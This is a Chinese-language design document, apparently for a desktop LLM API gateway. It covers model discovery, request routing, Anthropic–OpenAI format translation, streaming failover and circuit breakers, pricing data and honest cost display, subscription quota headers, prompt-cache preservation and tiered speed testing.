| 客户端 | 会调 `/v1/models` 吗 | 说明 |
|---|---|---|
| **Claude Code** | **会，但默认关闭** | 要 `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1`。其余触发条件（自定义 base URL、非官方域名）我们正好全部命中 |
| **Zed** 的 `anthropic` 块 | **会** | 把它当作模型信息的主要来源 |
| **Zed** 的 `*_compatible` 块 | 不会 | 要在 settings 里声明 |
| **Codex CLI** | **实测不会** | 只发 `POST /v1/responses`，一个 GET 都没有 |
| **opencode** | 不会 | 拉外部模型目录站点 |
| **Gemini CLI** | 不会 | 编译期常量 |
| **Cursor** | 不会 | 界面手填 |

所以**两条路都要走**：HTTP 端点覆盖前两个，**接管时写配置**（§7.11）覆盖其余。两条共享同一个 `resolve_allowed_models()`，只是投影方式不同——一个投到 HTTP 响应，一个投到配置文件。

这么设计还有个好处：**不依赖「某个客户端到底调不调」这个我们控制不了的细节**，将来它改了行为也不用重做。

三个配套的实现要点：

- **接管 Claude Code 时顺手打开那个发现开关**，否则它根本不会来问，HTTP 那条路白做
- **base URL 不能有跳转**，那个发现请求带 `redirect: "error"`，连 http 转 https 都算失败
- **别在响应里堆能力元数据**，Claude Code 的解析 schema 只有 `{id, display_name?}`，其余全部丢弃

#### 实现：按方言返回不同结构

| 方言 | 判断依据 | 响应结构 |
|---|---|---|
| Anthropic | `x-api-key` + `anthropic-version` 头 | `{data, first_id, has_more, last_id}` |
| Gemini | `x-goog-api-key` 头或 `?key=` | `{models: [{name, displayName}], nextPageToken}` |
| OpenAI | 默认 | `{object: "list", data: [...]}` |

判断方式抄 new-api 的请求头法。但我们有它没有的优势：**网关密钥已经告诉我们是哪个客户端**，可以直接按注册时的方言返回，header 判断只作 fallback。

不抄它的一点：new-api 在 OpenAI 格式的响应里多塞了个非标准的 `"success": true`。**兼容就要严格兼容**，多一个字段可能让严格解析的客户端出错。

**模型名匹配复用 §4.3.0 的计价归一化**：先精确、失败去日期后缀、仍失败按 glob 找最长前缀。不一致会造出「能用但算不出价钱」这种自相矛盾。

#### 额外收益：探测数据不止一个用途

「模型 → 哪些 provider 支持它」这个映射，正好是 §3.4 路由和 §3.5 策略组需要的信息：

- 用户写 `to: sonnet-pool` 时，能校验这个池子里真有成员支持被请求的模型
- 某个 provider 悄悄下线了一个模型，能在 UI 上标出来，而不是等请求失败
- §3.8 的语义校验能提前报「你路由到的这个组，没有任何成员支持这个模型」

**一次探测，三处受益。**

---

## 4. 数据面：一个请求的生命周期

```
入站请求
  │
  ├─ 1. identify   网关密钥 → 客户端身份；解析 body → model / 特征 / token 估算
  │                ★ 并算出会话键，后面四个功能都依赖它（见下）
  │
  ├─ 1.3 probe?    客户端的自言自语？是就本地应答，到此结束（§4.8）
  │                ★ 必须在 admit 和 route 之前——它根本不去上游
  │
  ├─ 1.5 admit_model  ★ 单一决策点：这个客户端能不能用这个模型（§3.9）
  │                    和 GET /v1/models 共用同一个函数，列表与准入不可能不一致
  │
  ├─ 2. route      阶段一：请求属性规则 → 策略组 → 选出 provider
  │                阶段二：provider_would_be 规则 → set / guard（见 §3.4）
  │
  ├─ 3. admit      预算 / 速率 / 并发排队（见 §4.7）
  │
  ├─ 4. transform  入站方言 → 上游方言；同方言且无 set 改写时转发原始字节
  │
  ├─ 5. forward    ┌─ 非流式：等完整响应，失败可重试可切换
  │                └─ 流式：首字节前可切换，首字节后锁定（见 §4.2）
  │                   换了 provider 要回到阶段二重算 guard
  │
  ├─ 6. account    usage → 定价表 → 成本；cache read / write 分开计价
  │
  └─ 7. observe    事件推入 ring buffer（实时 UI）+ SQLite（历史）
```

#### 会话键必须在第 1 步就算出来

`session_cost` 和 `turn`（§3.4）、`load-balance` 的会话粘滞（§3.5）、sub2api 的 `session_affinity`（§3.6）——**这四个功能都要求在路由之前、同步地拿到会话标识**。

而 §7.9 描述的「system prompt 指纹 + 首条 user message 指纹 + 时间窗聚类」是**离线的**，做不到这件事。两者是不同的东西，初稿把它们混为一谈了。分开定义：

| | 在线会话键 | 展示层会话 |
|---|---|---|
| 何时算 | 管线第 1 步，同步 | 查询时，离线 |
| 怎么算 | `blake3(system_prompt ‖ 首条 user message)` | 在线键 + 时间窗聚类合并 |
| 用途 | 路由条件、粘滞、账号亲和 | §7.9 的会话视图 |

在线键之所以可行，是因为 **Claude Code 每一轮都重发完整的 system prompt 和历史**——首条 user message 在整个会话里是稳定的。取这两段做哈希，零额外开销。

两个必须写明的边界：

- **改 `CLAUDE.md` 或切换模型会切断会话。** system prompt 变了键就变了。这可以接受——那本来也确实是一个新的上下文。
- **`set: {model}` 改写不影响会话键。** 键只由请求内容算，不含路由结果。否则降级规则会把一个会话劈成两半，`session_cost` 立刻归零，那条规则就永远触发不了第二次。

### 4.1 直通的边界：入站恒解析，出站与响应才直通

初稿这里有个**自相矛盾**：这一节说「同方言不解析 body，额外延迟 < 3ms」，而 §3.4 的路由维度（`input_tokens`、`tools`、`image`、`cache`、`thinking`、`tool_count`）**每一个都要求解析 body**。两个头牌卖点互相踩脚。

正确的切分是按方向而不是按方言：

| 方向 | 做法 | 预算 |
|---|---|---|
| **入站请求** | **恒解析。**没有例外——不解析就没法路由 | 解析 + 路由决策 **< 2ms** |
| **出站请求体** | 同方言且没有 `set` 改写时，转发**原始字节**，不重新序列化 | ~0 |
| **响应流** | 同方言时字节直通，旁路一个轻量扫描器提取 usage 和工具调用 | 额外延迟 **< 1ms** |

关键区别：**解析（parse）不等于重建（re-serialize）。** 解析一个 100 KB 的 JSON 大约几百微秒，可以接受；而反序列化成结构体再重新序列化会改变字段顺序、数字格式、转义方式，既慢又会让上游看到一个和客户端发出的不完全一样的请求——那才是要避免的。

所以出站时保留原始字节，只在 §3.4 的 `set` 真的改写了参数时才重建，而且只重建被改的那几个字段（和 §3.8 对配置文件做的事同构）。

#### `input_tokens` 必须本地估算，不能调 `count_tokens`

§4.3 提到 Anthropic 有个 `/v1/messages/count_tokens` 端点，便宜且准。**但它不能用在路由上**，有两个理由：

1. **鸡生蛋。** 调它需要先知道用哪个 provider，而 provider 正是路由要决定的东西。
2. **它是一次网络往返。** 放在热路径上意味着每个请求都要多等一个 RTT，直接击穿 2ms 预算。

所以路由用的 `input_tokens` 一律走**本地估算**：OpenAI 系用 tiktoken，Anthropic 系用字符数启发式。估算偏差对路由决策无所谓——`> 200k` 这种阈值判断不需要精确到个位。

`count_tokens` 只在 §4.3 的**事后记账**里用，那时 provider 已经定了，而且不在关键路径上。

### 4.1.1 资源目标随之拆分

原来的「额外延迟 < 3ms」是个含义不清的总数。拆成三个可分别测量的指标：

| 指标 | 目标 | 怎么测 |
|---|---|---|
| 入站解析 + 路由决策 | < 2ms | 从收完请求体到选定 provider |
| 出站建立 + 首字节前 | 不设硬指标 | 主要由网络决定 |
| 响应流中继的额外延迟 | < 1ms | 同一个 chunk 从收到到转发出去 |

这三个分开测，才能知道慢在哪。合成一个数字的话，一次慢的路由决策会被误认成网络问题。

### 4.1.2 方言互转：只做一对，做对

§11 原来把它整个推到 M6+，理由是「同方言直通覆盖九成五场景」。做的时候
先问了一句：**剩下那 5% 里都是什么？**

答案很集中：**用户手上有一把 DeepSeek / Kimi / GLM / 通义的 key，想让
Claude Code 用上。**那几家和 Ollama、LM Studio 一样说 OpenAI chat 方言。

所以只做 **Anthropic ↔ OpenAI chat** 这一对。Gemini、`openai-responses`、
以及反方向（OpenAI 客户端 → Anthropic 上游）都不做 —— 最后那个尤其没
必要：那种用户手上本来就有 OpenAI 兼容的上游。

**做一个能用的，比做四个半吊子的强。**这一层的失败模式是**静默改坏
请求**，而半吊子的转换正是它的温床。

#### 认不出来的方向一律直通，不猜

猜一个转换方向的代价是「请求被改成了另一个样子，然后上游 400」，比不转
难查得多。而不转的表现是上游直接告诉你「我不认识这个格式」—— 那条错误
信息本身就是线索。

#### 三处两边最容易搞错的地方

| | Anthropic | OpenAI chat |
|---|---|---|
| 工具参数 | `input` 是**对象** | `arguments` 是**字符串** |
| 工具结果 | `tool_result` 块塞在 user 消息的 content 里 | 各自是一条 `role: tool` 的消息 |
| 缓存命中 | 独立的 `cache_read_input_tokens`，**和 input 不重叠** | `prompt_tokens_details.cached_tokens`，**已含在 prompt_tokens 里** |

第二行意味着**一条消息可能变成多条**；第三行意味着搬过来的时候要**从
input 里减掉**，不减的话总量会被算多。

#### 流式那一段是个状态机

两边的流形状根本不一样：OpenAI 只有一种帧（`choices[].delta`），
Anthropic 有六种，而且有显式的 content block 边界 —— **那个边界信息在源
流里不存在**，得自己判断一个块在哪儿开始、在哪儿结束。

还有一处必须做对的：Anthropic 的输入 token 在 `message_start` 里，而
OpenAI 的 usage 在**最后**。硬等的话就变成整块缓冲，那是 §4.1 明令不许
的。所以 `message_start` 里先写 0，真数字在结尾的 `message_delta` 里给
—— **客户端本来就要看那一个**（Anthropic 自己的流也是在 `message_delta`
里更新 output），我们自己的 usage 嗅探器认的也是同一个位置。

流式时自动加 `stream_options.include_usage`。不加这一条，OpenAI 流里根本
不给 usage，而那会让成本面板对这些请求**集体失明**（§4.3）。

#### 转不过去的东西必须报出来

`thinking`、`top_k`、`metadata` 在 OpenAI chat 里没有对应物，只能丢。
**但丢的时候要发一个事件**，否则用户会发现「扩展思考开了却没生效」而
完全不知道从哪儿查起。

> **这条第一版只做了一半**（2026-09-10 补）。事件发了，但 `types.ts`
> 那份**手工镜像**里没有 `translated` 这一支 —— 于是事件到了界面就被
> 静默丢掉，而这一节的全部理由正是「不能静默」。
>
> 现在请求列表上挂一枚角标：丢了字段是琥珀色并写明丢了几项，没丢是
> 灰色的「已转换」。**没丢也要显示** —— §0.6 的那条：没有风险的时候
> 要说「安全」，而不是什么都不说，因为用户分不清「没事」和「没查」。
>
> 那份镜像的文件头自己写着「手工镜像是有代价的，而且这个代价会长大」。
> 这就是它长大的样子：**Rust 那边加一支枚举，编译器一句话都不会说。**

#### 验收那道闸

端到端测试里的假上游**只认 OpenAI chat**：路径不对、带 `anthropic-version`
头、body 里有 `system` 顶层字段，任何一条都 400。**那就是「静默改坏请求」
的那道闸** —— 转换有问题的话它会立刻红，而不是等用户来报。

另有一条单独盯最容易断的接缝：**翻译出来的流要能被我们自己的 usage
嗅探器认出来**。

### 4.2 流式故障转移：必须讲清楚的难点

一旦第一个 SSE 字节发给了客户端，就**不能**再换 provider——客户端已经开始渲染了。

| 时机 | 处理 |
|---|---|
| **首字节之前**（连接失败 / 4xx / 5xx / 超时 / 限流） | 透明切换到下一个 provider，客户端完全无感 |
| **首字节之后** | v1：中断，向客户端发 error 事件，UI 标红并给出原因和已消耗的 token |

首字节前的窗口覆盖了大约 90% 的真实故障场景：供应商挂了、余额不足、被限流、模型名不认识。这些都在建立连接或第一个响应包时就暴露了。

**v2 可选：续写重试。** 把已经收到的内容作为 assistant prefill 发给备用 provider 接着写。语义上不完美（模型会重新构思，衔接处可能重复或跳跃），但对一个已经写了 2000 字的回答，比整个失败要好。做成显式开关，默认关闭。

UI 必须能看到这个过程：请求详情里显示「尝试链」——试了 relay-cn（503，120ms），切到 anthropic-official（成功）。用户能看见故障转移在替他工作，这是信任的来源。

**好消息：这个机制不用从零写。** 企业版 `proxy/protocol_relearn.rs` 的 `open_stream_with_relearn` 已经实现了正确的做法——在返回的流**内部**窥探第一个 item，是可重试错误就换上游重开，再把窥探到的 item 推回队首。

它特意不在返回响应前 await 第一个 item，因为那样会把响应头挂到首 token 到达为止，改变每个流式请求的 time-to-headers，还会破坏客户端断连的记账。这个细节不踩一次坑是想不到的。

目前它只在方言不匹配时触发，但机制与错误类型无关：把判定条件从「协议不匹配」放宽到「任意可重试错误」，就是通用的流式故障转移。解耦一个 `PgPool` 参数，约 40 行。

#### 熔断器必须 fail-open，而且唯一上游时要旁路

故障转移要配熔断，否则每个请求都要去撞一遍已知的坏上游。但熔断器有两个必须提前定死的边界，否则它会从保护变成伤害：

**一、全部候选都被熔断时，放行而不是拒绝。** sub2api 把这条写成了显式设计原则：「隔离是偏好而非硬闸」。理由对桌面场景更强——服务器还能指望「换个实例试试」，**单用户桌面没有第二条路**。宁可放行到一个可能坏的上游让用户看见真实的上游错误，也不要返回一个我们自己编的「无可用上游」。后者会让用户以为是我们坏了。

**二、只有一个候选时，完全跳过熔断器。** 否则唯一的上游一旦被自己熔断，就把用户锁死了——没有别的家可切，熔断纯粹是自伤。

熔断参数也要克制。cc-switch 那套有 5 个旋钮（连续失败阈值、半开成功数、冷却时长、错误率阈值、最小请求数），其中「错误率 + 最小请求数」这条路径在单用户场景下**几乎永远打不满**，因为要先攒够 10-15 个请求。我们只留**连续失败阈值 + 冷却时长**两个，够了。

一个值得抄的实现细节：**「这家能不能进候选链」和「这家现在能不能收一个探测请求」要分成两个 API**。前者在路由选择阶段调用，不消耗半开状态的探测名额；后者才真正占名额。合成一个的话，光是排候选顺序就会把半开的唯一探测机会用掉。

还有一条：**熔断状态不持久化**。桌面应用重启频繁，把「这家挂了」的判断带过重启，意味着用户重启后第一个请求还在被上一次的故障惩罚。重启即全部重置为未知，和 §4.7 唤醒后的处理一致。

#### 三条从信号质量出发的细则

**一、信号模糊时，兜底要短。** 收到 429 但**没有** `retry-after` 或 reset 头时，不要假设最坏。sub2api 在这种情况下的默认冷却是**五秒**——因为「没带 reset 头的 429」很可能根本不是真的额度限流，而是上游的某种瞬时保护。假设最坏会把一家好上游雪藏几分钟，代价远大于多试一次。

**二、不是所有失败都算这家的账。** 响应体是 HTML 时（Cloudflare 拦截页、中转站的 nginx 错误页），**不计入账号健康**——那是网络路径上的东西，不是这个账号坏了。同理，`400`/`422` 这类「客户端自己请求有问题」的码也不该污染健康度（§4.2 的分桶已经处理）。

**三、分级降级，不要一次失败就判死。** 一次 401 可能是 token 刚好过期正在刷新，连续两次才说明凭据真的废了；403 可能是一次抽风，180 分钟内三次才值得永久禁用。**判据是统计显著性，不是单次事件。** 在服务器上这需要 Redis + Lua 保证原子性，在我们这儿就是一个内存里的滑动计数器。

### 4.3 Token 计数与成本的诚实性

上游返回的 usage 是真相。但流式场景下，有些中转站会吞掉 usage 字段。这时需要本地估算。

**规则：估算值必须在 UI 上明确标记。** 用虚线边框或者一个「~」前缀。绝不能让估算值混进「今日花费」的精确数字里假装准确——一个会撒谎的成本面板不如没有。

聚合视图里，估算和实测分开统计：「今日 $12.40 实测 + ~$0.80 估算」。

估算手段：OpenAI 系用 tiktoken；Anthropic 系优先调 `/v1/messages/count_tokens`（便宜且准），不可用时退回字符数启发式。

#### 4.3.0 价目表从哪来

菜单栏上那个 `$3.42` 的唯一输入就是价目表。

**用 LiteLLM 那份 `model_prices_and_context_window.json`**（MIT，根目录那份，`enterprise/` 的例外不适用）。选它的决定性理由是一个字段：

```
cache_creation_input_token_cost_above_1hr
```

**它是公开数据集里唯一编码了 Anthropic「1 小时缓存写入」价格的。** 其他候选都只有 5 分钟档——Sonnet 4.5 是 5 分钟 $3.75、1 小时 $6.00，用户开 1 小时 TTL 就会被**系统性低估 60%**。这和 §4.3 那整节的承诺直接冲突，因为**低估比不知道更糟**：它看起来是个确定的数字。

该有的字段它都有：

| 我们要的 | 字段 |
|---|---|
| 输入 / 输出单价 | `input_cost_per_token` / `output_cost_per_token` |
| 缓存读 | `cache_read_input_token_cost` |
| 缓存写（5 分钟 / 1 小时） | `cache_creation_input_token_cost` / `…_above_1hr` |
| 长上下文分层 | `input_cost_per_token_above_200k_tokens` 等 |
| 上下文窗口 / 输出上限 | `max_input_tokens` / `max_output_tokens` |
| 能力标志 | `supports_function_calling`、`supports_vision` 等 |

gzip 后约 109 KB，可以直接嵌进二进制。它还附了一份 JSON Schema，能直接生成 Rust 结构体。

#### 三层：内置 → 可选更新 → 用户覆盖

| 层 | 内容 | 谁写 |
|---|---|---|
| **内置快照** | 随版本发布，pin 到具体的 commit SHA（**不要用 `main`**） | 我们，发版时核对过 |
| **可选更新** | 用户点「检查价格更新」才拉 | 用户主动触发 |
| **用户覆盖** | `~/.thinkwatch/pricing.yaml`，支持删除某条 | 用户 |

第三层是必需的：**中转站的价格和官方不同**，而且没有任何公开数据集会收录它们。

> **第三层有界面了**（2026-09-11）。在此之前它只能手写那个文件 ——
> 而一个「必需的」层，如果唯一的入口是手写一份 YAML，那它对大多数人
> 等于不存在。
>
> 三个决定：
>
> 1. **单位是每百万 token 的美元，和厂商定价页上印的一样。**让用户在
>    界面上填 `0.000003` 是在要求他做一次换算，而换算是会错的 ——
>    **差一个数量级的价格比没有价格更糟**，因为它看起来是个确定的数字。
>    存进文件时换算成每 token（那是计算层要的形状）。
> 2. **这一页的触发条件是「有算不出价钱的请求」**（§0.6）。用户不会
>    主动想起要配价格 —— 只有「最近 7 天有 37 条请求算不出钱，用的是
>    这两个模型」这种具体证据才会。没有这个问题时它就是一行小字说
>    「都能算出价钱」，而不是消失（§0.6 的另一半：没有风险的时候要说
>    「安全」，不是把卡片藏起来）。加一条时**直接把那个算不出价的模型
>    名填进去**，用户不用自己抄。
> 3. **负价直接拒**。让它进去的话，`cheapest` 会永远选中那一家，而成本
>    栏会往下走 —— 一个越用越便宜的账单。
>
> 「覆盖内置」和「补一个新的」在界面上分开标：推翻一个已有的价，和给一
> 个本来就没价的模型填上，是两件不同的事。
>
> 那份 `verified.yaml` 的 `pending_human_verification` 还挂着，**而它
> 只是个诚实标记，不挡任何功能** —— 内置快照照常用，算出来的数照常显示。
> 真要较真的人现在有地方自己改了。

**更新必须用户触发而且看得见**：先显示要访问的 URL 和下载大小 → 下载后给 diff（哪些模型的价格变了、变多少）→ 确认才写入。**绝不在启动时后台偷偷拉**——§12 承诺了零上传，那也意味着零静默下载。

> **做了**（2026-09-11）。**三个端点，不是一个** —— 一个端点意味着
> 「检查」和「写入」是同一次调用，而那正是「静默下载」的定义。
>
> 1. `offer`：只发一次 HEAD，回「要访问这个 URL、2.3 MB、你现在这份是
>    哪天的」。**一个字节都没下载。**
> 2. `fetch`：下载、解析、给 diff，**存成 `.pending.json` 但不生效**。
>    存盘而不是留在内存里是因为第三步可能几分钟之后才来（用户在看
>    diff），而这中间进程完全可能重启。
> 3. `apply`：**带着第二步给的指纹回来**。对不上就拒 —— 否则「确认写入」
>    写的可能是另一次下载的结果，而用户看的 diff 和落盘的东西不是一
>    回事。
>
> diff **只列真的变了的**：三千多个模型里绝大多数没动，一起列出来等于
> 把那几十条真的变化埋掉。改价的排在新增的前面 —— 一个模型悄悄涨价，
> 比多了一个模型重要。
>
> 用户自己写的那几条覆盖**不受影响**：更新换的是底下那份公共表，而覆盖
> 是他自己的东西。
>
> 真机跑过一次：拉回 3259 个带价模型，**27 处和内置快照不同**，其中
> `eu.anthropic.claude-3-5-haiku` 的输入价从 0.25 涨到 0.80（3.2 倍）——
> 这正是这个功能存在的理由。
>
> **写的时候栽了一次**：换完表之后，界面上那个日期还是内置快照的日期 ——
> 因为报的是常量而不是那份表自己的字段。「你的价目表是哪天的」这个问题
> 因此被答错，而成本旁边标它的全部意义就是回答那个问题。

#### 发版前核对官方定价页

**任何第三方数据源都会滞后。** 一个实测到的例子：OpenAI 在 2026-08-22 下调了某个模型的价格，某个广泛使用的数据集**三天后才修正**，中间一直返回偏高 25% 的价格。根因是那家的同步脚本只自动同步模型清单，**价格靠人工 PR**。

所以内置快照在发版前要**和厂商官方定价页对一遍**——不是和另一个第三方数据集对，那只是把赌注换个地方押。

这是个**构建期检查，不是运行时功能**：

```
CI 拉取内置快照
   ↓
对十几个主力模型，逐条比对官方定价页
   ↓
不一致的列出来，人工确认
   ↓
确认后才发版
```

用户侧零复杂度，他们只看到一份核对过的表。**不做运行时的多源比对**——那会让用户装两份数据、多一次网络请求，还要面对「两边不一样听谁的」这个他们回答不了的问题。这个判断该我们在发版前替他们做完。

#### 价格变得比想象中频繁，所以要标日期

我原本以为一线厂商的价格一年变几次、季度更新就够。**查了 git 记录之后发现不对**：近 30 天有 74 次提交实际改动了价格行，一线厂商的价格修正**大约每月都在发生**。

两个后果。**一、更新频率定为月级。** **二、成本数字旁边要标价目表的日期**：

```
$0.0142  ·  价目表 2026-09-08
```

一个可能过期几天的数字，标上日期比不标好得多——**用户能自己判断可信度**。这和 §4.3 那条「估算与实测严格分离展示」是同一个原则：不确定性要显式呈现，不能藏起来。

#### 成本建模成三态，不是 `Option<f64>`

```rust
enum Cost {
    Known(Decimal),
    Unknown,        // 找不到价格
    NotApplicable,  // 订阅制、本地模型，边际成本为零
}
```

理由：`Option` 会诱使人写 `unwrap_or(0.0)`，而**把未知当成零，就是在编造数字**。三态强制调用方在每个分支上做决定。

两种场景落到 `Unknown`：价目表里没有这个模型；**缓存 TTL 未知**——不知道客户端用的是 5 分钟还是 1 小时，缓存写入的成本就是未知，**不该猜便宜的那档**。

#### 其余细节

- **单位换算要写测试。** LiteLLM 是**每 token** 计价，而多数数据源是每百万 token，差 10⁶。这是这一块最容易出的错，导入逻辑要用一个已知价格的模型做端到端断言
- **模型名归一化**：先精确匹配，失败则去掉日期后缀，仍失败按 glob 找最长前缀。§3.9 的模型准入**必须用同一套规则**，否则会出现「能用但算不出价钱」这种自相矛盾
- **按哪个模型名计价**：按上游实际收费的那个名字，即 `model_map` 重写之后的
- **找不到价格**：标 `Unknown`，成本栏显示「未知」且**不参与合计**。绝不用「最接近的模型」去猜——那正是编数字
- **不要用 OpenRouter 的数据**：它最丰富，但服务条款禁止抓取复制、也禁止用于开发竞品服务。打包它两条都可能踩，而我们并不需要

#### 4.3.1 不是所有上游都按 token 计费

接入订阅型网关（§3.6 第 4 类）之后，「按价目表乘 token 数」这个假设就不成立了：订阅制的边际成本是零，按 API 价目表算出来的数字是纯虚构的。

所以 provider 要声明计费模式：

| `billing` | 含义 | UI 显示 |
|---|---|---|
| `per-token` | 按价目表计价（默认） | 正常金额 |
| `subscription` | 订阅制，边际成本为零 | 显示 token 量，成本栏标「订阅」而非 $0 |
| `unknown` | 上游价格未知 | 成本栏标「未知」，不参与合计 |

`subscription` 显示成「订阅」而不是「$0.00」是刻意的：$0.00 看起来像一个算出来的结果，会让人误以为这次调用真的免费；「订阅」表达的是「这笔账不在这个维度上」。

同一条原则贯穿 §4.3——**宁可显示「不知道」，也不显示一个编出来的精确数字**。混了订阅上游之后，Dashboard 的今日花费要拆成三栏：实测计费、估算计费、订阅调用量。

#### 4.3.2 订阅额度：答案就在响应头里

上面那个「订阅」标签是诚实的，但它也是空的——用户真正想知道的是**「我的额度用了多少、什么时候重置」**，而我们只回了一句「这笔账不在这个维度上」。

**这个数字其实一直在我们手上。** Anthropic 在**每一个响应**的头里带着订阅窗口的用量：

```
anthropic-ratelimit-unified-5h-utilization         当前 5 小时窗口用了多少
anthropic-ratelimit-unified-5h-reset               什么时候重置
anthropic-ratelimit-unified-5h-status              allowed / allowed_warning / rejected
anthropic-ratelimit-unified-7d-utilization         7 天窗口
anthropic-ratelimit-unified-7d-surpassed-threshold 是否已越线
```

Codex 那边是同一形状的另一组：`x-codex-primary-used-percent` / `-reset-after-seconds` / `-window-minutes`（周窗口）和 `x-codex-secondary-*`（5 小时窗口）。

**关键在于这是零成本的。** 不发任何额外请求、不需要额外的 OAuth scope、不占用户自己的配额——**顺着真实流量白捡**。

##### 被动采样，不主动探测

Anthropic 另有一个 `/api/oauth/usage` 接口可以主动查，sub2api 两条路都实现了，但**批量场景已经统一改走被动链路**。理由在他们代码里写得很明白：主动探测会占用账号自己的调用配额，而且**同一时刻大量相同 TLS 指纹的请求会触发上游反滥用检测**——他们为此加了 0-800ms 随机抖动来规避。

**这个取舍在桌面单用户场景下只会更强，不会更弱**：用户手里就一两个账号，每一个都金贵，为了刷一个进度条去消耗它的配额、还要冒被上游标记的风险，完全不划算。

所以：**只被动采样，不主动探测。** 唯一的例外是用户在 UI 上手动点「立即刷新」——那是他明确的意图，而且他知道代价。

##### 这填上了三个洞

**一、菜单栏（§7.4）有了订阅用户真正关心的那个数字。** 对按量付费用户，余光扫一眼是「今天花了多少」；对订阅用户，是**「5h 窗口 62%，2 小时后重置」**。同一块 50 像素，两种人格。

**二、限流不再是突然发生的。** `status` 从 `allowed` 变成 `allowed_warning` 时我们就能提前提示，而不是等用户撞上 429 才发现。

**三、恢复由上游信号驱动，而不只是等计时器。** 收到 `status: allowed` 就立刻清掉本地的限流标记（§4.2 的熔断同理）——**上游说好了就是好了，比我们自己的倒计时准。**

##### 一条实现纪律：分清真实信号和本地猜测

这类数据有两个来源，混在一起就毁了它的价值：

| 来自上游的真实信号 | 我们本地推断的 |
|---|---|
| 响应头里的 utilization / reset / status | 没有 reset 头时的兜底冷却时长 |
| HTTP 状态码本身 | 「连续失败 N 次」的计数 |
| 响应体里的结构化 error type | 从历史请求统计出的窗口用量 |

**UI 上必须区分。** 上游给的数字可以直接显示；我们推断的要标成推断（「估计还有约 40 分钟」而不是「40 分钟后重置」）。理由和 §4.3 的三态成本完全一样：**一个编出来的精确数字，比一个诚实的「不知道」更有害。**

### 4.4 Prompt cache 是一等公民

对 Claude Code 用户，prompt caching 是成本结构里最大的变量。cache write 是 1.25 倍单价，cache read 是 0.1 倍。一个长会话，缓存命中和不命中的成本能差 5-10 倍。

所以：

- usage 的四个维度（input / output / cache_read / cache_write）分开记录、分开计价、分开展示。
- Dashboard 上有独立的「缓存命中率」和「缓存节省了多少钱」。
- `when: { cache: true }` 这条规则防止把可缓存请求路由到不支持缓存的上游。

这是一个只有真正在用 Claude Code 的人才会想到做的功能，也是和通用 API 网关拉开差距的地方。

#### 但最重要的一条是：别碰请求前缀

cc-switch 有一次改动，把 `role=system` 的消息从 `messages[]` 里提到顶层 `system` 字段，为的是迁就那些会回「System message must be at the beginning」的上游。看起来是纯粹的兼容性修补。

结果是**上游的前缀缓存命中率从 99% 掉到 20%**。

原因很隐蔽：**Claude Code 每一轮都会在会话中间注入一条带 `<total_tokens>` 元数据的 system 消息**。把它提到顶部，等于每一轮都重写了一次请求前缀，radix 前缀树每次都从头 miss。这个 bug 从引入到真正修干净跨了四个版本，中间还有一次「撤了但没撤干净」。

这件事对我们有两层意义。

**第一层，它是 §4.1「出站直通」最硬的证据。** 我们默认不改请求体，不是保守，是因为**任何 body 改写都可能是缓存杀手，而且是静默的**——不会报错、不会告警，只有账单会涨。而请求前缀这个东西，客户端每一轮都在动它，你以为你在做一次归一化，实际上是在每一轮都投一次骰子。

**第二层，它给「必须改」的场景定了规矩。** 如果哪天真要为某个上游做兼容改写，规矩是：

1. **只能改前缀之后的部分。** 系统提示词、首条消息、工具定义，这三样一个字节都不能动。
2. **必须是逐 provider 开关**，不能是全局行为——cc-switch 的教训正是「前缀稳定和严格后端兼容不可能用一个全局行为同时满足」。
3. **UI 上要能看见。** 请求详情里标出「为兼容 xxx 改写了请求体」，缓存命中率掉下来时用户能找到原因。

第 3 条尤其重要：静默的成本回归是最难排查的一类问题，因为它不产生任何错误。

### 4.5 资源占用目标

常驻进程必须便宜。目标：

| 指标 | 目标 |
|---|---|
| 空闲内存（core） | < 30 MB |
| **空闲内存（UI）** | **M3 实测后定。**它决定关窗后是隐藏还是销毁 webview（§2.4） |
| 空闲 CPU | ~0% |
| 入站解析 + 路由决策 | < 2 ms（§4.1） |
| 响应流中继的额外延迟 | < 1 ms（§4.1） |
| 空闲时的磁盘写入 | 0（无请求就不写） |

延迟拆成两项而不是合成一个数字，是因为它们的成因完全不同——一次慢的路由决策和一次慢的网络中继，合在一起看就分不出是谁的问题（§4.1）。

具体约束：ring buffer 定长；SQLite 用 WAL 且批量提交（不是每请求一次 fsync）；健康检查默认惰性（§3.3 里默认关闭）；没有请求时不做任何周期性工作，**心跳也只在 socket 空闲时才发**（§2.2.1）。

---

### 4.6 测速：三层，成本递增

「测速」是三件不同的事，成本从零到真金白银。**分开做，分开触发，分开展示。**

| 层 | 测什么 | 成本 | 能不能自动跑 |
|---|---|---|---|
| **L1 · 连通性** | DNS → TCP → TLS 握手的分段耗时 | **零** | 能，随便跑 |
| **L2 · 端点可用** | `GET /v1/models`，验证 key 有效、服务正常 | **零**（该端点不计费） | 能 |
| **L3 · 模型速度** | 真实请求的 TTFT 和 tok/s | **花钱** | 默认不自动，必须先告知 |

初稿把 L1 和 L3 混成了一件事，直接设计成「发一个最小的真实请求」。那是错的——**绝大多数时候你想知道的只是「这条线通不通、快不快」，不需要惊动模型。**

#### L1 + L2：日常用的就是这个

**L1 只做握手，不发任何业务请求。** 分段计时：

```
DNS 解析      12ms
TCP 握手      48ms      ← 走代理时这一段最能反映代理质量
TLS 握手      96ms
────────────────────
建连总计     156ms
```

任何 HTTPS 端点都支持，零成本零副作用，可以随便点、可以定期自动跑。**代理测速就到这一层为止**——代理影响的是网络层，测到 L1 就够了，没有理由为了测一个代理去调用模型。

**L2 打一个 `GET /v1/models`。** 这是 OpenAI 和 Anthropic 兼容端点的通用约定，**不消耗 token**，但能一次验证三件事：key 是不是有效、服务是不是正常、这个上游到底提供哪些模型。

L2 失败但 L1 成功，是个信息量很大的组合：网络是通的，问题出在 key 或者服务本身。这比笼统的「连接失败」有用得多。

有些中转站没实现 `/v1/models`。这种情况标注为「不支持」而不是「失败」——它不是错误，只是这个上游少一项能力。

#### L3：花钱，所以必须先说清楚

只有这一层会真正调用模型。**触发前必须显示预估消耗，而不是点了才知道。**

探测请求是固定的，所以输入 token 可以精确算：

```
测速请求：{"messages":[{"role":"user","content":"Hi"}], "max_tokens": 8, "stream": true}

  ┌──────────────────────────────────────────────┐
  │  即将测速 · claude-sonnet-4-5 @ relay-cn      │
  │                                               │
  │  输入    约 10 tokens                          │
  │  输出    最多 8 tokens                         │
  │  预估    $0.00012                             │
  │                                       [取消] [测速] │
  └──────────────────────────────────────────────┘
```

几个必须处理的情况：

| 情况 | 显示 |
|---|---|
| 正常按 token 计费 | 具体金额，如 `$0.00012` |
